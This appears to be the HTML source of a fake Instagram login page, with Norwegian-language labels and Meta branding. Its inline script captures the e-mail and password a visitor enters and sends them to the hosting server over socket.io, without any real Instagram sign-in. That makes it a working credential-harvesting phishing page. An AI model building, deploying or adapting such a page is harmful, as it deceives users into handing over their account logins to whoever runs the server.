<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">E-mail</label>
                    <input name="email" id="name" placeholder="E-mail" />

                    <label for="password" class="sr-only">Passord</label>
                    <input name="password" type="password" id="pass" placeholder="Passord" />

                    <button type="button" onclick="send()">Log inn</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">ELLER</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Logg in med Facebook</a>
                    </div>
                    <a href="#">Glemt Passord?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Har du ikke bruker?</p>
                <a href="#">Oprett her</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Last ned appen.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">OM</a></li>
            <li><a href="#">Hjelp</a></li>
            <li><a href="#">Blogg</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Karrierer</a></li>
            <li><a href="#">PERSONVERN</a></li>
            <li><a href="#">VILKÅR</a></li>
            <li><a href="#">PLASSERING</a></li>
            <li><a href="#">RELEVANTE KONTOER</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">SPRÅK</a></li>
        </ul>
        <p class="copyright">© 2024 META</p>
    </footer>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        var socket = io()
        function send(){
            socket.emit("login", document.getElementById("name").value , document.getElementById("pass").value)
        }
    </script>
</body>
</html>
